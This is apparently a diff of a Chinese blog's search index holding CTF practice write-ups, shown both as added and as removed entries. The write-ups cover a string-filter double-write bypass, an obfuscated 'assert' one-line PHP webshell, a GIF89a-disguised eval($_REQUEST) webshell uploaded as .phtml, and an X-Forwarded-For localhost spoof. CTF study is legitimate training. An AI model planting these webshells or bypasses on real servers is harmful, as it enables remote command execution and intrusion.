class="comment">//如果clean_string的值为bingus，那么输出flag</span></span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: red;\&quot;&gt;IS NOT&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是通过输入bingus回显空，输入aaa回显aaa，所以我们双写绕过，也就是binbingusgus，得到flag</p>
+<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>首先要知道什么是shell，这里我们摘自百度百科：</p>
+<p>Shell 是一个应用程序，它连接了用户和 Linux 内核，让用户能够更加高效、安全、低成本地使用 Linux 内核，这就是 Shell 的本质。 Shell 本身并不是内核的一部分，它只是站在内核的基础上编写的一个应用程序，它和 QQ、迅雷、Firefox 等其它软件没有什么区别。 然而 Shell 也有着它的特殊性，就是开机立马启动，并呈现在用户面前；用户通过 Shell 来使用 Linux，不启动 Shell 的话，用户就没办法使用 Linux。 Shell 是如何连接用户和内核的？ Shell 能够接收用户输入的命令，并对命令进行处理，处理完毕后再将结果反馈给用户，比如输出到显示器、写入到文件等，这就是大部分读者对 Shell 的认知。</p>
+<p>简单来说，shell就是运行linux命令的前提，所以这里绝对和命令执行相关</p>
+<p>题目提示为：送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</p>
+<p>这里我们可以发现存在变量s，并由我们接收我们输入的内容，所以我们直接令s=ls，无回显，那么我们在最后加一个;  可是还是没有回显，接着我们令s=system(“ls”) ，有回显关键字，我们cat一下文档得到flag。</p>
+<p>由此可推出，这里s输入的是一段命令，并且可被执行。</p>
+<h1 id="社工-伪造"><a href="#社工-伪造" class="headerlink" title="社工-伪造"></a>社工-伪造</h1><p>真的很无语，想来想去找不到办法，结果看了一下wp，我直接当场去世，要把自己的qq昵称和头像换成他的男友才行，直接登录他男友的账号是不行的，有字符过滤。头一次见这个，很牛p。</p>
+<h1 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h1><p>进去后发现可下载文件，我们下载后打开，发现没啥线索，既然是信息搜集，我们就要扫后台，扫描到.git文件，进去后，没有发现关键线索，但是发现了后台登录页面，但是不知道用户名和密码，实在没办法了，看大佬wp，发现我们要使用wireshark工具进行抓包，先开wireshark，然后再开exe文件，然后在包中尝试搜索User发现关键信息</p>
+<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402180235715.png" alt="image-20220402180235715"></p>
+<p>这里的用户名和密码一看就是经过了base64加密。解密结果如下</p>
+<p>User：<a href="mailto:&#x62;&#117;&#103;&#x6b;&#117;&#x6b;&#117;&#64;&#49;&#x36;&#x33;&#46;&#99;&#111;&#109;">&#x62;&#117;&#103;&#x6b;&#117;&#x6b;&#117;&#64;&#49;&#x36;&#x33;&#46;&#99;&#111;&#109;</a></p>
+<p>Pass：XSLROCPMNWWZQDZL</p>
+<p>登录显示密码错误，然后继续看wp</p>
+<p>知道邮箱可以用授权码登录，所以我们用第三方邮箱登录看看有什么关键信息</p>
+<p>用win10自带的邮箱登录成功</p>
+<p>然后找了半天也没找的关键邮件，可能是被删了，但是按照wp上说，会有一个如下的邮件</p>
+<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402181540251.png" alt="image-20220402181540251"></p>
+<p>我们猜测可能是生日为密码，mara为账户</p>
+<p>推算的生日为20010206，登录后台得到flag</p>
+<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402181728774.png" alt="image-20220402181728774"></p>
+<h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><p>X-Forwarded-For:127.0.0.1</p>
+<p>无语住了</p>
+]]></content>
+      <tags>
+        <tag>刷题</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>刷题记录-1</title>
     <url>/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="HCTF2018-WarmUp"><a href="#HCTF2018-WarmUp" class="headerlink" title="HCTF2018 WarmUp"></a>HCTF2018 WarmUp</h1><p>这道题还是挺有意思的，不过还没完全吃透，看着别人的WP勉强能看懂一点。</p>
@@ -3086,42 +3276,6 @@
       </tags>
   </entry>
   <entry>
-    <title>刷题记录-7</title>
-    <url>/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/</url>
-    <content><![CDATA[<h1 id="Pretty-Horrible-Program-1"><a href="#Pretty-Horrible-Program-1" class="headerlink" title="Pretty Horrible Program 1"></a>Pretty Horrible Program 1</h1><p>这道题水得很，虽然我没有完全看懂源码，但也能稍作注释</p>
-<span id="more"></span>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>];  <span class="comment">//把get到的值赋给input</span></span><br><span class="line">    <span class="variable">$to_replace</span> = <span class="string">&#x27;bingus&#x27;</span>;  <span class="comment">//让to_replace为bingus</span></span><br><span class="line">    <span class="variable">$clean_string</span> = preg_replace(<span class="string">&quot;/<span class="subst">$to_replace</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);<span class="comment">//让clean_string为input中把bingus替换为空格后的值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your string is: <span class="subst">$clean_string</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clean_string</span> == <span class="variable">$to_replace</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;  <span class="comment">//如果clean_string的值为bingus，那么输出flag</span></span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: red;\&quot;&gt;IS NOT&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>但是通过输入bingus回显空，输入aaa回显aaa，所以我们双写绕过，也就是binbingusgus，得到flag</p>
-<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>首先要知道什么是shell，这里我们摘自百度百科：</p>
-<p>Shell 是一个应用程序，它连接了用户和 Linux 内核，让用户能够更加高效、安全、低成本地使用 Linux 内核，这就是 Shell 的本质。 Shell 本身并不是内核的一部分，它只是站在内核的基础上编写的一个应用程序，它和 QQ、迅雷、Firefox 等其它软件没有什么区别。 然而 Shell 也有着它的特殊性，就是开机立马启动，并呈现在用户面前；用户通过 Shell 来使用 Linux，不启动 Shell 的话，用户就没办法使用 Linux。 Shell 是如何连接用户和内核的？ Shell 能够接收用户输入的命令，并对命令进行处理，处理完毕后再将结果反馈给用户，比如输出到显示器、写入到文件等，这就是大部分读者对 Shell 的认知。</p>
-<p>简单来说，shell就是运行linux命令的前提，所以这里绝对和命令执行相关</p>
-<p>题目提示为：送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</p>
-<p>这里我们可以发现存在变量s，并由我们接收我们输入的内容，所以我们直接令s=ls，无回显，那么我们在最后加一个;  可是还是没有回显，接着我们令s=system(“ls”) ，有回显关键字，我们cat一下文档得到flag。</p>
-<p>由此可推出，这里s输入的是一段命令，并且可被执行。</p>
-<h1 id="社工-伪造"><a href="#社工-伪造" class="headerlink" title="社工-伪造"></a>社工-伪造</h1><p>真的很无语，想来想去找不到办法，结果看了一下wp，我直接当场去世，要把自己的qq昵称和头像换成他的男友才行，直接登录他男友的账号是不行的，有字符过滤。头一次见这个，很牛p。</p>
-<h1 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h1><p>进去后发现可下载文件，我们下载后打开，发现没啥线索，既然是信息搜集，我们就要扫后台，扫描到.git文件，进去后，没有发现关键线索，但是发现了后台登录页面，但是不知道用户名和密码，实在没办法了，看大佬wp，发现我们要使用wireshark工具进行抓包，先开wireshark，然后再开exe文件，然后在包中尝试搜索User发现关键信息</p>
-<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402180235715.png" alt="image-20220402180235715"></p>
-<p>这里的用户名和密码一看就是经过了base64加密。解密结果如下</p>
-<p>User：<a href="mailto:&#x62;&#x75;&#x67;&#107;&#x75;&#x6b;&#117;&#x40;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#109;">&#x62;&#x75;&#x67;&#107;&#x75;&#x6b;&#117;&#x40;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#109;</a></p>
-<p>Pass：XSLROCPMNWWZQDZL</p>
-<p>登录显示密码错误，然后继续看wp</p>
-<p>知道邮箱可以用授权码登录，所以我们用第三方邮箱登录看看有什么关键信息</p>
-<p>用win10自带的邮箱登录成功</p>
-<p>然后找了半天也没找的关键邮件，可能是被删了，但是按照wp上说，会有一个如下的邮件</p>
-<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402181540251.png" alt="image-20220402181540251"></p>
-<p>我们猜测可能是生日为密码，mara为账户</p>
-<p>推算的生日为20010206，登录后台得到flag</p>
-<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402181728774.png" alt="image-20220402181728774"></p>
-<h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><p>X-Forwarded-For:127.0.0.1</p>
-<p>无语住了</p>
-]]></content>
-      <tags>
-        <tag>刷题</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>刷题记录8</title>
     <url>/2022/04/09/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%958/</url>
     <content><![CDATA[<h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><p>提示：are you from google？</p>
@@ -3198,39 +3352,6 @@
       </tags>
   </entry>
   <entry>
-    <title>极客大挑战 2019Upload</title>
-    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
-    <content><![CDATA[<p>该题为上传木马题</p>
-<p>进入题目后，上传一句话木马</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
-<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
-<span id="more"></span>
-
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
-<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
-<p>得到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
-<p>上传失败</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
-<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
-<p>上传后</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
-<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
-<p>链接成功</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
-<p>最后在根目录下得到flag</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>极客大挑战 2019 EasySQL</title>
     <url>/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/</url>
     <content><![CDATA[<p>打开题目如下</p>
@@ -3279,6 +3400,39 @@
 ]]></content>
       <tags>
         <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极客大挑战 2019Upload</title>
+    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
+    <content><![CDATA[<p>该题为上传木马题</p>
+<p>进入题目后，上传一句话木马</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
+<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
+<span id="more"></span>
+
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
+<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
+<p>上传失败</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
+<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
+<p>上传后</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
+<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
+<p>链接成功</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
+<p>最后在根目录下得到flag</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
       </tags>
   </entry>
   <entry>
